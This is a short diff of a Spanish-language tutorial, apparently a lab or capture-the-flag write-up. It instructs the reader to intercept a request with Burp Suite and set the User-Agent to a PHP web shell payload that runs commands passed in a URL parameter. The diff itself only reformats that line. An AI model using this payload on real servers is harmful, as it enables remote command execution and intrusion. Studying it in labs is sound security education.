@@ -67,7 +67,9 @@ Primero tendremos que abrir el Burp Suite e interceptar la petición.
 
 Ahora modificaremos el campo User Agent con la cadena:  
 
-<?php system($_GET['cmd']); ?>  
+`<?php system($_GET['cmd']); ?>` 
+
+
 
 
 
